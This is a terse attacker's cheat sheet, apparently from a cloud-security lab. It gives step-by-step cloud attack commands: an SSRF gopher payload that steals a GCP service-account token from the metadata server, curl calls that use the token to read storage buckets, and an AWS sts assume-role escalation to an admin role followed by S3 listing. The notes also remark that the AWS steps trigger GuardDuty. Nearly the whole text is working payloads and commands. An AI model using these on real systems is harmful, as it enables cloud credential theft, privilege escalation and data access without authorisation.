
## GCP PHP upload
====================================================================================================
Find vulnerable upload

http://35.226.245.121/profile.php?url=http://example.com

whois 35.226.245.121
  //GCP

// Try different versions of this
```
http://metadata.google.internal/computeMetadata/v1beta1/
```

// throw at repeater as you cant set the cookie
```
gopher://metadata.google.internal:80/xGET%2520/computeMetadata/v1/instance/service-accounts/<snip>-compute@developer.gserviceaccount.com/token%2520HTTP%252f%2531%252e%2531%250AHost:%2520metadata.google.internal%250AAccept:%2520%252a%252f%252a%250aMetadata-Flavor:%2520Google%250d%250a
```

// Grab the token
```
gopher://metadata.google.internal:80/xGET%2520/computeMetadata/v1/instance/service-accounts/bucketviewer@gr-proj-1.iam.gserviceaccount.com/token%2520HTTP%252f%2531%252e%2531%250AHost:%2520metadata.google.internal%250AAccept:%2520%252a%252f%252a%250aMetadata-Flavor:%2520Google%250d%250a
```

// use it
```
export GOOGLE_ACCESS_TOKEN=
sudo curl -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" "https://www.googleapis.com/storage/v1/b/gigantic-retail/"
curl -H "Authorization: Bearer $GOOGLE_ACCESS_TOKEN" "https://www.googleapis.com/storage/v1/b/gigantic-retail/o"

```
====================================================================================================


## AWS assumeRole
// this will flag guardduty

```
aws iam get-user-policy --user-name temp-user --policy-name test-temp-user
  // look for Action: sts:AssumeRole

aws sts assume-role --role-arn arn:aws:iam::107513503799:role/AdminRole --role-session-name MySession
  // grab the creds

aws configure
aws configure set aws_session_token "<SessionToken>"
aws sts get-caller-identity
  // now that you have admin
aws s3 ls s3://emergency-data-recovery

```
